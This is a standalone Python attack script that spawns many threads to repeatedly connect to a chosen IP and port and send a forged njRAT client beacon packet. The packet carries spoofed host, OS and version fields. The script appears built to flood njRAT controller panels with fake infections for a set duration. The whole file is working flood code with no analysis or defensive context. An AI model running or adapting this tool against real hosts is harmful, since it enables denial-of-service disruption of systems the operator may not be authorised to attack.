#!/usr/bin/env python3

import time
import socket
from threading import Thread

# Payload for NJRAT
payload = b"149\x00ll|'|'|SGFjS2VkXzc2MTNBMTJG|'|'|SERVERPC|'|'|ser|'|'|14-05-27|'|'||'|'|Win 8.1 ProSP0 x86|'|'|No|'|'|0.7d|'|'|..|'|'|UHJvZ3JhbSBNYW5hZ2VyAA==|'|'|"
print(payload)
def NJRAT_ATTACK(threads, attack_time, target): 

	# Finish
	
	global FINISH
	FINISH = False
	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting NJRAT attack...")
	

	threads_list = []

	def njrat_flood():
	
		global FINISH

		while True:
		
			if FINISH:
				break
			
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((target_ip, target_port))
			except Exception as e:
				print(e)
				print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to connect to NJRAT client!")
				exit()
				
			try:
				sock.sendall(payload)
			except Exception as e:
				print(e)
				time.sleep(0.25)
				continue
			else:
				print("\033[1;32m"+"[+]"+"\033[0m"+" NJRAT client is connected!")      

	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
		t = Thread(target = njrat_flood)
		t.start()
		threads_list.append(t)
		
	# Sleep selected secounds
	time.sleep(attack_time)
	
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.")
